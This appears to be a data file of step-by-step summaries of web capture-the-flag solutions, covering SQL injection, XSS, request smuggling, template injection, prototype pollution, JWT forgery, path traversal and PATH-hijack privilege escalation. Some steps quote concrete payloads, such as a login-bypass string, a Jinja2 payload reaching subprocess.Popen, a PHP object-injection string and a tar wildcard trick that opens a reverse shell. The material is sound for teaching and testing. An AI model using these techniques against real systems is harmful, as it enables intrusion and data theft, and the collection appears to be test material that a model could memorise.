    "Here we can see an 'if' condition which looks like the logic behind the login function",
    "It is calculating the SHA256 hash of concatenation of 'password' and 'salt'",
    "Then it compares it with a 'hash' value",
    "But if we take a look carefully we can see that the values of 'salt' and 'hash' are being taken from the JSON request body",
    "So we can set our own 'salt' and 'hash' just like 'username' and 'password'",
    "I wrote a small python script to get the flag",
    "Here 'username', 'password' and 'salt' can be any values, we just need to satisfy the if condition to get the flag",
    "Start at a login/register page",
    "Login into the system",
    "Explore the UI features such as: public feed, profile settings, report link, create post button, search, copy profile link, and followers",
    "Understand how to modify user's profile and upload images, try XSS payloads on different input fields but discover that JavaScript is blocked",
    "Try a bypass method by uploading HTML files disguised as image files (using a GIF header for instance)",
    "Discover that HTML files are uploaded successfully despite checks for images, but they don't execute on the server side, instead, they are downloaded with random filenames",
    "Switch strategy and attempt to upload an HTML file containing a simple JavaScript function (such as an alert)",
    "Observe that JavaScript inside the uploaded HTML does execute, even if not when directly input into the application's fields",
    "Understand the need to 'steal' an admin cookie and gain admin access, but encounter the HttpOnly problem",
    "Review the challenge description again and shift focus to the 'following' feature",
    "Craft a JavaScript snippet that sends a GET request to the '/profile/follow' endpoint, which would theoretically make any user that accesses a page with that script embedded follow the attacker account",
    "Embed this crafted JS snippet into an HTML file and upload it to the user profile",
    "Get the uploaded HTML file link from the webpage and report it, tricking admin into opening the page and thus executing the JS script silently",
    "Confirm the success of the attack when a new follow request from admin appears",
    "Attempt to guess admin's subdomain and utilize the 'subdomain enumeration' technique when guessing proves unsuccessful",
    "Discover the admin's subdomain and visit the profile, finding out it is private but has a 'follow' button",
    "Attempt to follow admin, receiving a pending request response",
    "Decide to use the same strategy to make admin accept the follow request",
    "Understand that this time a POST request must be sent to '/profile/request' with the 'id' of the attacker's user embedded in the request body",
    "Locate the JWT token within the session cookie, decode it and extract the 'id' of the user (attacker)",
    "Gain admin's acceptance as a follower and finally find the flag within a fan post, completing the challenge",
    "Connect to port 12380 using Apache httpd 2.4.49",
    "Research on vulnerabilities of Apache httpd 2.4.49 and find possible exploits",
    "Use 'ls' and 'cat' commands to explore files",
    "Use curl command to navigate subdirectories and exploit Apache vulnerabilities to access the desired file",
    "Base64 encode the flag.png as part of the request payload to prevent unintended data loss or corruption",
    "Receive the png in Base64 onto local machine",
    "Did a NIKTO scan on the target using the command: nikto -h http://172.17.15.117:443/",
    "Noticed a line in the scan result showing: '+ /.env: .env file found. The .env file may contain credentials.'",
    "Followed the directory path indicated in the scan result to explore further",
    "Inserted the file name in the URL as: http://172.17.15.117:443/3e6f0e21-7faa-429f-8a1d-3f715a520da4.png",
    "Found the flag.",
    "Connected to target IP:33337 which redirected to domain name threeofhearts.ctf.net",
    "Discovered that the website was hosted on an Apache Traffic Server 7.1.1 and the Nginx server 1.15.5.",
    "Tried to perform an HTTP request smuggling attack by sending two get requests separated with 65534 empty spaces",
    "Found that the first of the two get requests resulted in a 400 error while the second revealed an internal web page.",
    "Managed to work with BurpSuite by placing a zero in between the two GET requests.",
    "Intercepted the request and set the 'Host' header manually to threeofhearts.ctf.net using a browser.",
    "Discovered a PHP form for var1 and var2 which, on submission, made a GET request to /save.php and populated an entry in /out/save.txt.",
    "Found /private.php which was inaccessible but likely contained the hidden flag.",
    "Discovered that a successful HTTP request smuggling attack led to the server sending a second request with admin headers.",
    "Sent a request to /save.php with var1 and var2 parameters using 'Transfer-Encoding: chunked' and 'Content-Length:53' headers.",
    "Fetched headers and PHP session ID from /out/save.txt.",
    "Accessed /private.php using the fetched headers and session ID, leading to the page with the flag.",
    "Found a web app with a register and login page",
    "Registered a user to get access to the website",
    "Discovered user details were stored in a JavaScript variable in the webpage response",
    "Intercepted the register request to inspect the parameters being sent",
    "Added an extra parameter 'account[role]=admin' to attempt gaining admin privilege",
    "Successfully gained admin privilege and access to an admin button",
    "Clicked the admin button to retrieve the flag",
    "Opened port 80",
    "Set up socks correctly",
    "Accessed challenges",
    "Claimed Free Flag",
    "Identified and connected to port 11111",
    "Identified SQL Injection vulnerability",
    "Confronted with stability issues with multiple users trying to attack using sqlmap simultaneously",
    "Managed to extract a very long alphanumeric password from the database",
    "Encountered an obstacle where the password was longer than the max character limit allowed by the login page",
    "Bypassed the character limit issue by passing the password with Burp Suite",
    "Retrieved a link leading to flag.png file after passing the password",
    "Identified in hindsight an alternate solution to bypass the login via the username field using SQL injection",
    "Identified an alternative approach to bypass authentication using the password field",
    "Missed the potential for using an SQL injection into the password field as an authentication bypass.",
    "Access the website provided in the challenge",
    "Notice that the website is about cookies based on presented information",
    "Identify 3 key sections: User Registration, User Login, and Admin Login",
    "Register a user account on the website",
    "Inspect the cookies provided upon account registration",
    "Locate 4 key cookies: admin, authenticated-user, made-an-account, and visited-main-page",
    "Change the admin cookie value from false to true",
    "Send the modified request back to the server",
    "Received the flag as a result of the modified admin cookie",
    "Accessed a website with a list of four different image galleries.",
    "Noticed that one gallery was set to private and could not be unnecessarily accessed.",
    "Noticed that the URL changes when querying any other galleries.",
    "Attempted to use the local-host address to access the admin panel of the website.",
    "Successfully logged into the admin panel by injecting an address into the URL parameter.",
    "Found and untick a box inside the admin panel making the private gallery public.",
    "Accessed the newly public gallery and found the flag.",
    "Started with port 20022",
    "Noticed that user cookie is double base64 encoded",
    "Double decoded the user cookie",
    "Found a PHP object in the decoded cookie with three attributes: 'username', 'admin', and 'profile_img'",
    "Identified the task as a PHP Object Injection challenge",
    "Tried to become admin, but the server sent hints or funny responses",
    "Direct access to the flag was not successful",
    "Used directory traversal (../) to access the flag by manipulating the 'profile_img' attribute in the PHP object",
    "Final payload was a modified PHP object with the 'profile_img' attribute pointing to the flag",
    "Injected the 'id' command in the input box to find out user and read permissions",
    "Used 'ls' command enclosed in backticks to list the files",
    "Found an 'index.php' file in the results",
    "Used 'cat index.php' command to see the code",
    "Blacklisted characters and command length limit of 15 characters identified from the code",
    "Checked the parent directory with 'ls ../' and found 'flag.txt'",
    "Attempt to use 'cat ../flag.txt' failed due to exceeding character limit",
    "Utilized the un-blacklisted linux redirection character '<' to read the flag with '< ../flag.txt'",
    "Used curl command to send a GET request to the given URL http://challenge.nahamcon.com:31428/",
    "Spoofed the client IP address by using the X-Forwarded-For header",
    "Set the X-Forwarded-For header to 127.0.0.1 to emulate local host client access, aiming to access internal files",
    "Accessed the given website and observed an interface that offered XML parsing as a service.",
    "Identified that the system might be susceptible to an XXE (XML External Entity) attack based on the mention of XML.",
    "Knowing the flag was located in /var/www, prepared an XML payload designed to extract information from that location.",
    "Uploaded the XML payload to the 'trial' tab of the web interface.",
    "Used the 'view XML' tab on the web interface to review the XML return, successfully extracting the flag from /var/www.",
    "Opened the website and examined its interface.",
    "Found the URL of /robots.txt.",
    "Accessed the /robots.txt URL and discovered a Disallowed path /ingen/.",
    "Navigated to the disallowed path /ingen/ and discovered a text file named flag.txt.",
    "Accessed the flag.txt file and found the challenge flag.",
    "Inspect the Python file provided in the challenge, which includes some regex functionality",
    "Analyze the Python code, noting that it ignores the first letter if it's uppercase and establishes a pattern based on this",
    "Use a debugging tool such as regex101 to view code specifics and ensure understanding",
    "Consult the official Python documentation to learn about special characters usable in regex",
    "Identify the '|' operator as potentially useful, as it allows for matching of either of two separate regular expressions",
    "Test the code with 'flag{randomString}' to determine suitable regular expressions",
    "Create a new regex matching the 'flag{randomString}' pattern, using the '|' operator",
    "Replace the initial regex in the Python code with the newly created one",
    "This allows the flag to be obtained",
    "Visited the URL: https://space.sdc.tf/",
    "Viewed the page source",
    "Identified unique JavaScript with nextExport, autoExport and buildId attributes",
    "Performed GET request to host https://space.sdc.tf with the endpoint /api/status",
    "Received a response indicating a healthy status and version",
    "Noticed three endpoints (/status, /rocketLaunch, /fuel) in the response",
    "Requested the /fuel endpoint, received a list of pumps and their IDs",
    "Attempted a simple GET request to /rocketLaunch, received a notice that the request body must be JSON",
    "Leveraged the assumption that a POST request might be needed and that the word 'launch' could be a keyword",
    "Sent a POST request with 'launch' attribute set to true",
    "Upon receiving a missing rocket name error, a random rocket name was added to the POST request body",
    "Received an error indicating 'triton' as an available rocket name",
    "Assigned 'triton' as the rocket name in the POST request body",
    "Then received an error for missing launch time, added a random timestamp to the POST request body to understand the format",
    "Once the correct timestamp format was identified, the timestamp was updated in the POST request",
    "The error message then indicated pumpId was missing, added a random pump ID from earlier /fuel endpoint response",
    "The error message then indicated a missing token, scoured the page source and Javascript files to locate the token",
    "Incorporated the token identified in the Javascript files into the POST request",
    "Finally, successful completion of POST request was achieved with all required parameters, capturing the flag",
    "The challenge hints at memory issues",
    "An integer entry can be submitted, and the web application responds",
    "The web application conducts a check for blank entries; 'n' values cannot be blank",
    "The max length of 'n' can be '8', any entry larger will result in an error",
    "The web application does not check for duplicate parameters, permitting the submission of an additional, identical 'n' parameter",
    "Located the 'admin' page and '.git' directory via robots.",
    "Used the internetwache GitTools to dump file contents of websites.",
    "Dumped the '.git' directory.",
    "Used extractor tool to get files from the dump.",
    "Located 2 'users.db' files, both are sqlite3 databases.",
    "Identified that one database contains 'bcrypt' hashes and another contains 'md5' hashes.",
    "Cracked the md5 hashes first due to less required time.",
    "Located a valid credential which was 'aaron@cgau.sdc.tf : weakpassword'.",
    "Used the located credential to login on 'admin.html'.",
    "Acquired the flag upon login.",
    "Found 3 log file links in the blog",
    "Inferred that additional log files should be found based on hints in the challenge description",
    "Created a custom wordlist of potential log file names based on the URLs of existing logs",
    "Ran ffuf to fuzz the challenge site and find more logs using the wordlist",
    "Found over 1900 logs through this method",
    "Attempted to find 'sdctf' in the logs using curl, but was unsuccessful",
    "Downloaded all available logs with wget to search for the flag",
    "Ran grep to search for unusual text in the logs, disregarding common words",
    "Noticed leaks of bash history in the logs",
    "Found a command to a netcat session",
    "Found what appeared to be a password",
    "Logged in as dennisb@uupeye.edu",
    "Retrieved the link to the admin portal from student communication",
    "Tried to bruteforce the admin portal without success",
    "Attempted SQL login bypass using burpsuite with the following payload: admin@uupeye.edu' or '1'='1",
    "Successfully bypassed login and accessed the admin portal",
    "Accessed admin panel with intention to edit friend's grades specified over 4 semesters",
    "Inferred from the challenge that grades are uploaded through a json file",
    "Inspected page source and found a link for an example json file",
    "Modified the given example json file by adding more semesters and setting the production value to true",
    "Used the following json to successfully upload the updated grades",
    "Uploaded changes and received flag indicating successful completion of challenge",
    "Obtained the email of the target: alexo@uupeye.edu",
    "Identified students may have weak passwords",
    "Found students' emails exposed at https://wpiadmin.wpictf.xyz/topStudents",
    "Compiled a list of emails to attempt password brute force",
    "Started brute forcing process to gain access",
    "Successfully accessed all accounts with the credentials",
    "Checked each profile for potential flags",
    "Found a flag in the profile of dennisb@uupeye.edu",
    "Define the URL of the website that the SQL Injection will be performed on.",
    "Initialize an empty password string for storing the inferred password.",
    "Create an infinite loop that will run until the password is fully determined using the SQL Injection.",
    "Loop through each character in '0123456789abcdef' (hexadecimal).",
    "Create a SQL Injection payload that uses a wildcard pattern and append the current character. 'or password like {}{}%' --' would check if the password starts with the current guessed string.",
    "Send a POST request with the crafted payload to the target URL.",
    "Check the response for the text 'No such person'. If this string is not found, it means that the guess was correct -- that character exists in the password at that position.",
    "Append the current character to the password string and output it, along with a section of the server response trimmed by slicing.",
    "Use the flag variable to denote a successful guess. If a guess was successful, restart the loop to guess the next character.",
    "If a guess was not successful (denoted by the flag remaining False after the loop), it means the full password has been guessed. Break the infinite loop and exit the script.",
    "Go to the rule page.",
    "Read the page carefully until reaching the line at the bottom.",
    "Note that the flag of the challenge is represented as 'SharifCTF{MD5(lowercase(Hello_Rules))}'",
    "Open Python on the command line tool.",
    "Import the md5 function from hashlib in Python.",
    "Turn the string 'Hello_Rules' into lowercase using Python's string method '.lower()'.",
    "Encode the string into bytes and hash it using md5.",
    "Combine the hashed string with 'SharifCTF{hash_here}' to form the flag.",
    "Investigate the HTML code of the website and identify fields that need to be extracted",
    "Write a Python script to automate the extraction of hidden fields from the website's HTML",
    "Create a function 'get_hidden' in the Python script that takes a URL as an argument, sends a GET request, extracts the response text (HTML), and uses regular expressions to find specific fields",
    "Create a function 'get_passwords' that generates all possible combinations of YYYYMM from the years 1900 to 2019 and months from 1 to 13",
    "Use the functions 'get_hidden' and 'get_passwords' in a brute-force attack to find the correct password for the username 'jack'",
    "Log in to the website using the username 'jack' and the discovered password",
    "Inspect the functionality of the website, noting that it includes the ability to upload photos and the showcasing of uploaded photos",
    "Examine the URLs associated with different users and photos",
    "Notice a 'session_id' stored in a cookie, which is an MD5 hash that can be cracked",
    "Experiment with the session_id by changing the hashed value to correspond to different usernames",
    "Change the hashed value in the session_id cookie to correspond to the username 'admin'",
    "Try to load a webpage associated with the 'admin' user",
    "When faced with a security check, attempt to bypass it by loading image URLs directly",
    "Discover the security question answer from one of the images",
    "Use the discovered security question answer to bypass the security check and log in as the 'admin' user",
    "First, the attacker found an API which is used to modify the status of the services.",
    "Then, the attacker checked all npm packages for vulnerability and found that a package name fast-json-patch is vulnerable to Prototype Pollution.",
    "The Prototype Pollution vulnerability was confirmed from an external source, a GitHub Pull Request.",
    "The web application was then identified to be using 'ejs', known to be capable of Remote Code Execution (RCE) by prototype pollution.",
    "Finally, the attacker exploited the system by sending a crafted POST request with malicious payload to change the status of the services, which performed an RCE due to Prototype Pollution, leading to the flag.",
    "Checked the source code, found CSP settings",
    "Found that the site only allows images of the same origin and script tags with nonces as external resources",
    "Identified that it's possible to embed any code into html with the GET parameter",
    "Verified the xss at URL",
    "Understood the purpose of the attack is an image only displayed when the bot accesses the site",
    "Identified that the cookie 'token' has the httpOnly attribute, so it cannot be retrieved by XSS",
    "Discovered plan of attack involving creating a new script tag, converting flag images to base64 data, and sending image data externally with the 'src' of the generated script tag",
    "Minified the code to be read as XSS",
    "Split large image data into three parts as it exceeded the length that could be specified in the url",
    "Sent these URLs to the bot, base64 encoded image data was sent to the requestbin",
    "Displayed this data in html to get the flag",
    "The first step in solving this challenge was to analyse the verify() function.",
    "The verify() function includes three checks: verifyUsername(), verifyPassword(), and verifyMFA().",
    "The first function, verifyUsername(), was just a simple string comparison, indicating that the correct username was 'D0loresH4ze'.",
    "In the second function, verifyPassword(), the code showed that a bcrypt password verification is used.",
    "The bcrypt hash was known from the PHP manual and revealed that the password was 'rasmuslerdorf'.",
    "verifyMFA() function appeared to check a 10 digit random number.",
    "Since the variable 'mfa' was created by unserializing user requests, it was possible to make 'mfa' and '_correctValue' match by using object injection.",
    "After object injection, the expected solution was constructed as 'O:8:\"stdClass\":4:{s:8:\"username\";s:11:\"D0loresH4ze\";s:8:\"password\";s:13:\"rasmuslerdorf\";s:13:\"_correctValue\";N;s:3:\"mfa\";R:4;}'.",
    "The userdata parameter was created by base64 encoding of this solution string.",
    "On the mfa service, this userdata was included as a request parameter.",
    "Finally, it allowed receiving the flag, which is the proof of successful authentication.",
    "Change the location of the flag component in the XML",
    "Identifies a Server-Side Template Injection (SSTI) vulnerability in the password field within the code.",
    "Tests the SSTI vulnerability by inputting a mathematical operation as the payload into the password field making the server return the result of the operation.",
    "Identifies a SQL injection vulnerability in the 'data-server' project.",
    "Executes commands using the SSTI vulnerability to read directory contents.",
    "Takes note of the directory contents returned by the server.",
    "Identifies an inaccessible server that is hosting data-server.",
    "Plans to send requests containing SQL to the server.",
    "Writes a python script in which an SQL payload is sent to the inaccessible server by using SSTI to force the execution of the payload.",
    "Loops through a list of characters, appending each character to an initial flag string. In each loop, a script is created and encoded into base64. This script is sent as an SSTI payload.",
    "Sends the payload via POST request and check if 'True' is in the response. If 'True' is present, the flag string character is an actual flag character; that character is then appended to the flag.",
    "Notes that due to the server filtering the character '.', the script is encoded into base64 to bypass this filtering.",
    "Notes that because the server does not have CURL, a python script is used to send requests.",
    "Analyze the provided Python code for vulnerabilities",
    "Identify that the code has a SQL injection vulnerability due to concatenating user input directly into the SQL query",
    "Craft SQL injection payload that always returns true and comments out the rest of the query",
    "Input the crafted payload '1 OR 1=1--' into the vulnerable function",
    "Execute the function, thus exploiting the SQL injection vulnerability",
    "Retrieve and capture the flag 'LITCTF{flagr3l4t3dt0pok3m0n0rsom3th1ng1dk}' as the output of the successful exploit",
    "The first step started by examining the cookies in the HTTP request and identifying a key called 'likeCookie' whose value was set to false.",
    "The value of 'likeCookie' was then changed to true which resulted in a response message suggesting the value could range from 1 to 20.",
    "A Python script was written to automate the process and test the different values for 'likeCookie' by making HTTP GET requests. The script uses the 'requests' library to send HTTP requests, and a for loop was used to iterate through the numbers from 1 to 20.",
    "The script sends a GET request to the target URL with each possible 'likeCookie' value (from 0 to 19). For each request, it checks if the response text contains 'LITCTF{' (indicating a CTF flag).",
    "Once the flag is found in a response, the script prints out the corresponding 'likeCookie' value and stops the loop.",
    "Executing this script provides the CTF flag hidden by the server on a specific 'likeCookie' value.",
    "Analyzed the provided PHP code for the application's API request handling.",
    "Observed that 'c' parameter in requests was used to manipulate the user session, either to sign in, sign up, or sign out.",
    "Found that the user check 'is_admin()' would proceed to handle the 'c2' admin command parameter if true, otherwise would call 'redirect()'.",
    "Identified that 'redirect()' function did not actually terminate the script, but printed HTML output, allowing further code execution.",
    "Figured out the need of a passcode to perform admin functions.",
    "Discovered that '/lib/db/user.db' and '/lib/db/passcode.db' can be directly accessed from the server.",
    "Identified admin credentials and passcode from the accessed user database and passcode files.",
    "Discovered that 'export_db' function could be exploited to read file contents if the passcode was correct.",
    "Recognized that file path in 'export_db' function could be manipulated for path traversal.",
    "Performed a POST request to the /api.php endpoint with 'id', 'pw', 'c', 'c2', 'pas', and 'db' parameters, using path traversal to access the flag.",
    "Finally, found the flag 'ACSC{it_is_hard_to_name_a_flag...isn't_it?}'.",
    "Identified a 'genflag' server intended for Server Side Request Forgery (SSRF).",
    "Recognized that 'mobile-viewer' couldn't directly interact with server due to remote address and user agent checks.",
    "Noticed server-rendered pages as screenshots.",
    "Realized needed to request 'http://genflag/flag' from 'website' using '/home/stypr/readflag' on that same 'website'.",
    "Discovered that 'website' runs 'yarn dev', which in turn runs 'vitepress dev src', and that Vitepress is in dev mode.",
    "Found that Vitepress running in dev mode enabled CORS and opened up path traversal vulnerabilities.",
    "Used the path traversal to get the SSH key from 'http://website/../../../../../home/stypr/.ssh/id_rsa'.",
    "Created a CSRF request using Fetch API on 'mobile-viewer' page to get SSH key to our attacker site.",
    "Used btoa javascript function to base64 encode the private key for safe transmission in an HTTP GET request to the attacker's server.",
    "Retrieved the received private key and used it to SSH onto the target server.",
    "Obtained the flag from within the target server.",
    "Accessed and analyzed the code of the Cowsay as a Service Challenge",
    "Identified that the '/usr/games/cowsay' game is operated from 'child_process.spawnSync'",
    "Observed that the settings endpoint sets the settings for 'ctx.state.user', which equals to the 'username' cookie, and the setting name is user-controlled",
    "Realized there's potential for prototype pollution as user can influence the setting name",
    "Executed a HTTP POST request with '__proto__' as username to set settings",
    "Used 'shell' as the setting name in the POST request to set 'shell=true' for all objects",
    "This action made the command run within a shell, allowing command injection to be performed",
    "Run a HTTP GET request with injection command which echo the FLAG environment variable",
    "Successfully retrieved the Flag",
    "The server uses dynamic rendering, which renders JavaScript on the server-side before serving web crawlers.",
    "Checked the Nginx configuration and noticed that it re-writes and forwards the request to the pre-renderer at `http://renderer:3000` when `User-Agent` header is of the web crawlers.",
    "Detected that the server uses Prerender to handle these requests, implying that Chrome is used to render JavaScript.",
    "Set the host header so that the renderer visits our attacker-controlled site.",
    "Utilized an XSS attack to redirect the browser using the `Location` header.",
    "Created a `redirect.php` that when visited would redirect the renderer's browser to our second exploit page.",
    "Constructed a `exploit.html` file with an iframe whose source is `http://localhost:3000/render?url=http://api:8000/`.",
    "To access the iframe's contents which should be the response from `http://api:8000/`, bypassed SOP by exploiting the fact that the current site and the iframe's source are both `http://localhost:3000`.",
    "Received the iframe's contents: `PGhlYWQ+PC9oZWFkPjxib2R5PkFDU0N7c2hhcmtzX2FyZV9hbHdheXNfaHVuZ3J5fTwvYm9keT4=`.",
    "Decoded the received Base64 string to get the flag: `ACSC{sharks_are_always_hungry}`.",
    "Reviewed the problem statement and noticed that the target application had a dependency on 'jsonwebtoken' 3.2.2",
    "Realized that 'jsonwebtoken' 3.2.2 had a known authentication bypass vulnerability",
    "Examined the application's server code and noticed that the JWT token is checked in the response for '/localisation-file'",
    "Understood that the JWT token is essentially encoded JSON data which are signed and verified on the server-side",
    "Noticed that the public key used for the JWT token handling is stored in the '__dirname' directory",
    "Discovered that the server generates a JWT token with the 'language' field set according to the parameter passed via the POST handler for '/localization-language'",
    "Realized that the GET handler for '/localisation-file' allows the reading of arbitrary files given the input 'language' in the JWT token",
    "Understood the constraints of the language input due to a regex check",
    "Tested the theory by sending a POST request to the '/localization-language' endpoint with the JSON data where 'language' is set to 'key'",
    "Set the 'language' parameter to 'key' in the JWT token",
    "Sent a GET request to '/localisation-file' to retrieve the key file",
    "Signed the token using the retrieved public key which the server misconstrued as an HMAC private key due to the vulnerability",
    "Created a script to generate the JWT payload with 'language' parameter set to 'flag.txt' and the token signed using the public key",
    "Verified that the token is successfully signed and the 'language' parameter was indeed changed to 'flag.txt'",
    "Used the server's own mechanism against it by setting the 'lion-token' cookie to the generated token to read the contents of 'flag.txt'",
    "Read the challenge description thoroughly",
    "Inspect the provided Nginx configuration for any vulnerabilities",
    "Identify the '/admin' directive in the Nginx configuration that denies all requests",
    "Discover a hidden endpoint '/admin/key' from the server code",
    "Realize that the access to '/admin/key' is needed to get the key",
    "Identify another part of the Nginx configuration that preserves request headers when requests are forwarded to Gunicorn",
    "Research on whether the HTTP headers can manipulate the processing of URL path by Gunicorn",
    "Find out that the 'SCRIPT_NAME' WSGI variable can strip its prefix from 'PATH_INFO'",
    "Understand that ‘SCRIPT_NAME’ can be set through an HTTP header, which can bypass the '/admin' denial in Nginx configuration",
    "Realize that the decryption key can be obtained by supplying a 'key_id' in the HTTP headers",
    "Use the site’s JavaScript to generate the 'key_id'",
    "Find out the decryption key by using the 'key_id'",
    "Modify the '/decrypt' endpoint to decrypt the file using the found decryption key",
    "Find out the flag",
    "Identified a Server-Side Template Injection (SSTI) vulnerability on a Flask webpage with certain blacklisted words as restriction",
    "Determined a method of bypassing the Jinja2 SSTI filters using GET request arguments and accessing them through `request.args`",
    "Used `attr()` to pass the blacklisted characters, this Jenja2 built-in filter gets an attribute of an object and the payload `/submit?value={{()|attr(request.args.c)}}&c=__class__` resulted in `().__class__` being evaluated and displayed to the user",
    "Used the method `().__class__.__base__.__subclasses__()` to get subclasses of the base class",
    "Formulated a GET request that accessed the subclass information",
    "Copied the output and used a Python script to find `<class 'subprocess.Popen'>` in the subclasses and found it at index 258",
    "Accessed this index to leverage `subprocess.Popen` to achieve Remote Code Execution (RCE)",
    "Constructed another GET request to execute 'ls' command on the server using `subprocess.Popen`",
    "Finally, read the flag file `cat flag.txt` and obtained the flag",
    "The username is reflected back into the username field (its `value` attribute) after failed authentication",
    "By fuzzing username inputs, finding that anything after a whitespace is removed.",
    "Furthermore, 'admin' is replaced non-recursively.",
    "Exploit an SQL injection in the username parameter with the payload: username=adadminmin';#&password=",
    "This will translate to the query: SELECT * FROM users WHERE username='admin';#",
    "Retrieve the flag: flag{wh0_n3ed5_a_p4ssw0rd_anyw4y}.",
    "Access and inspect the front-end JavaScript source code",
    "Identify that Meteor is being used to fetch data from a MongoDB backend",
    "Discover all the exposed Meteor methods including 'notes.count', 'notes.add', and 'notes.remove'",
    "Observe that 'notes.count' function is unauthenticated",
    "Understand that 'notes.count' applies a filter and returns the count of notes that pass this filter",
    "Use Burp Suite to find that this method is being executed through websockets",
    "Deduce that the '$ne' filter checks if the body of the notes is not empty",
    "Understand '$regex' is acceptable, allowing regex patterns for note contents",
    "Check for notes that match the regex pattern 'flag{.*}', testing the filter",
    "Validate that only one result is returned, indicating only one note contains the flag",
    "Use this technique to bruteforce every character of the flag",
    "Concatenate possible characters to the end of the flag",
    "For each possible character, check if it is part of the flag by verifying if the count returns 1",
    "Output the character if it returns a count larger than 0",
    "Repeat this until the entire flag ('flag{4lly0Urb4s3}') is discovered",
    "Analyze the code to understand its behavior and identify potential vulnerabilities.",
    "Determine the code checks file extensions for uploaded files, only allowing 'txt', 'pdf', 'doc', 'docx', 'xls', 'xlsx'.",
    "Identify the code also normalizes file paths to prevent directory traversal attacks.",
    "Discover the use of the 'os.system()' method to execute the tar command when downloading all uploaded files, indicating potential wildcard injection vulnerability.",
    "Understand Wildcard Injection and how it can be abused to perform command injection attacks by manipulating the use of wildcards in system commands.",
    "Identify the vulnerability lies in the use of tar utility which incorporates use of wildcards and an option '--checkpoint-action' that specifies execution of a program at a checkpoint, on reaching 10 records by default.",
    "Understand the need of overcoming file extension restrictions to implement a successful attack.",
    "Conceptualize the attack by creating files '--checkpoint-action=exec=sh shell.txt' and '--checkpoint=1'. As '--checkpoint=1' does not pass the file extension check, find alternatives by digging into tar documentation.",
    "Uncover that the tar utility creates a checkpoint after every 10 records by default and each record is made up of 20 blocks of 512 bytes each.",
    "Devise the exploit to upload enough bytes to exceed 10 records, hence causing the checkpoint action to be executed.",
    "Initialize a GET request to the target URL.",
    "Create a file 'shell.txt' with the desired payload. Here, create a reverse shell back to attacker's machine.",
    "Subsequently, create another file '--checkpoint-action=exec=sh shell.txt' with nothing inside. This just serves to pollute the arguments for tar command and passes the extension check due to .txt extension.",
    "Send POST requests to upload both these files.",
    "Start a loop to generate and send multiple POST requests to upload multiple files of random content until the total size exceeds 10 records.",
    "For each iteration, create a file of 1024 bytes with a random name ending in '.txt', send a POST request to upload this file, then create a tar archive with these files and verify the current size of the tar archive.",
    "After the combined size of the uploaded files exceeds the size of 10 tar records, trigger the exploit by sending a GET request to '/download_all'. This executes the tar command with wildcard arguments, causing it to execute the payload in 'shell.txt'.",
    "Successfully obtain a reverse shell on the target system.",
    "Visited lukas-app.de and observed that it's a static site and doesn't have much to exploit",
    "Given the clues in the challenge hint, performed a certificate search using crt.sh",
    "Identified two additional subdomains through the certificate search",
    "Noticed a redirect to a different domain when fetching an image, indicating another possible server",
    "Final server returned Server: Apache/2.4.50 (Unix), which is known to be vulnerable to a recent path traversal vulnerability",
    "Attempted and failed to exploit this vulnerability using standard payload",
    "URL-encoded the payload again to bypass double URL decoding by server",
    "Adjusted exploit path based on Twitter inspiration from similar challenges",
    "Successfully exploited the path traversal vulnerability using a triple URL-encoded payload",
    "Read the Apache configuration file which revealed mapping, leading to the hypothesis that the web app could be stored in the same directory",
    "Read the Python source code for the web app, found faulty secret key handling",
    "Changed session username to 'root' using client-side cookies",
    "Signed the Flask cookie with the desired username to authenticate as 'root'",
    "Visited the website with the updated cookies to retrieve the flag",
    "App was composed of frontend and payment backend with separate user accounts",
    "When transactions were performed, messages were signed using ED25519 to prevent tampering",
    "Checked that balance never went below 0",
    "Users were redirected to '/callback' on the frontend application",
    "Messages and signatures were verified by the frontend",
    "GET query parameters were added to the messages before verification",
    "'request.args.get('amount')' was added to the user balance",
    "Identified possibility to use 'Parameter Pollution' by having two 'amount' arguments",
    "Created new user with username 'FRONTEND_USERNAMEamount1337' to manipulate the message format",
    "Server was able to provide signature for this manipulated message",
    "Performed parameter pollution on the frontend with 'GET /callback?user=FRONTEND_USERNAME&amount=1337&amount=0&nonce=NONCE&sig=SIGNATURE'",
    "Due to frontend processing, this resulted in the same verified message but carrying a different meaning",
    "Successfully added 1337 coins to the account",
    "Retrieved the flag 'CSR{sometimes_it's_really_hard_to_create_good_flags}'",
    "Signed up on the website and viewed the invoice URL, which was in the format '/legacy_invoice_system/BASE64_ENCODED_STRING'",
    "Decoded the base64-encoded string to 'USERNAME-YEAR-MONTH-DAY'",
    "Added a special character (') to the end of the username, causing an SQL error",
    "Collected from the error message that the username and signup date were passed into the SQL query without sanitization",
    "Created a custom SQLMap tamper script that appends a payload to the back of the signup date and base64-encoded the entire input before passing it to the injection point at 'GET /legacy_invoice_system/*'",
    "Ran SQLMap with the script using the command 'sqlmap -r invoice.req --tamper tamper.py --threads 10 -T news_article --dump' to dump the database",
    "Located the flag within the public news_article table of the database dump",
    "Used basic SQL injection payload `1' or '1'='1` to return existing data.",
    "Experimented with `1' ORDER BY` commands to deduce the number of columns based on error return.",
    "Determined that SELECT and UNION keywords were being filtered by regex but stacked queries were allowed.",
    "Used `1'; SHOW DATABASES;` to reveal the names of active databases.",
    "Used `1'; SHOW TABLES;` to get a list of table names in the database.",
    "Described the 'words' table and the '1919810931114514' table using the `1'; DESCRIBE tablename;` command.",
    "Used `1'; USE information_schema; SHOW TABLES;` to get a list of tables in the 'information_schema' database.",
    "Attempted to uncover stored procedures and functions using `1'; SHOW PROCEDURE STATUS; SHOW FUNCTION STATUS;`.",
    "Levied MariaDB's support for the 'EXECUTE IMMEDIATE' command to run queries as strings, bypassing regex filters.",
    "Used `1';EXECUTE IMMEDIATE CONCAT('SEL', 'ECT * FROM words');` and ``1';EXECUTE IMMEDIATE CONCAT('SEL', 'ECT * FROM `1919810931114514`');`` to retrieve data from tables.",
    "Used backticks around the numeric table name to prevent it from being interpreted as a number.",
    "Identified that the binary calls the 'id' command three times, with and without privileges",
    "Recognized the need to manipulate the PATH variable to execute arbitrary code when 'id' is called, due to the SUID flag being set",
    "Understood the goal to read the 'flag.txt' file that requires root access, meaning a shell needs to be spawned as root",
    "Created a bash script that would only spawn the shell if the caller is root",
    "Translated the bash script into a one-liner to create a malicious 'id' payload",
    "Went to the '/tmp' directory",
    "Created an 'id' file with the malicious payload and set its permissions to 777 to make it executable",
    "Exported '/tmp' to the PATH to ensure the shell would execute the malicious 'id'",
    "Ran 'insecure' to obtain a root shell and confirm the malicious 'id' could be run as root",
    "Read the 'flag.txt' file using the root shell, successfully getting the challenge flag",
    "Perform a directory scan to reveal available endpoints.",
    "Identify '/cmd.php' endpoint as potentially allowing command injection.",
    "Attempt command injection, noting there appears to be a blacklist filter.",
